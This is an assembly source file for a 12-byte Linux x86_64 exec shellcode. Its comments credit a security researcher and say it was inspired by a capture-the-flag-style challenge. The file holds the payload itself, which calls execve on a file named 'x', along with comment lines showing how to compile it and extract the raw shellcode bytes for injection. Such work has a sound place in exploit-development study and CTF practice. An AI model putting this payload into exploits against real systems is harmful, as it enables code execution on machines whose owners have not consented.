#
# exec-tiny.s - 12-bytes Linux/x86_64 exec shellcode 
# Copyright (c) 2025 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# Shellcode inspired by a challenge that shall remain unnamed to prevent 
# spoilers.
#
# Useful commands:
# $ gcc -nostdlib -static shellcode.s -o shellcode-elf
# $ objdump -M intel -d shellcode-elf
# $ strace ./shellcode-elf # doesn't work with with self-modifying code
# $ objcopy --dump-section .text=shellcode-raw shellcode-elf
# $ xxd -p shellcode-raw | tr -d '\n' | sed 's/../\\x&/g'
#

.intel_syntax noprefix
.global _start

.text
_start:
    # execve("x", NULL, ...)
    push 0x78
    push rsp
    pop rdi             # "x"
    xor rsi, rsi        # NULL
    cdq                 # NULL
    mov al, 59          # execve
    syscall             
